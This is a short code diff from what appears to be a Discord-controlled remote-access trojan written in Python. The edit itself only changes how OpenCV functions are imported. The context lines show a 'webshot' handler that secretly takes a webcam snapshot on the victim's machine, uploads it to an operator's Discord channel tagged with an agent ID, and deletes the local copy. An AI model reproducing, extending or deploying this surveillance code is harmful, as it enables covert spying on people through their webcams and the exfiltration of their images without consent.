@@ -4,7 +4,8 @@ import os
 import subprocess as sp
 import requests
 import random
-import cv2
+from cv2 import VideoCapture
+from cv2 import imwrite
 import platform
 import re
 from urllib.request import Request, urlopen
@@ -271,13 +272,13 @@ async def webshot(context):
     word_list = command.split()
     if int(word_list[0]) == int(ID):
         try:
-            cam = cv2.VideoCapture(0)
+            cam = VideoCapture(0)
             ret, frame = cam.read()
 
             current_time = datetime.now()
             path = "{}/Webcam{}{}{}.png".format(USER_PROFILE, current_time.year, current_time.month, current_time.day)
 
-            cv2.imwrite(path, frame)
+            imwrite(path, frame)
 
             await channel.send(f"**Agent #{ID}** | Webcam snapshot {path}", file=discord.File(path))
             os.remove(path)
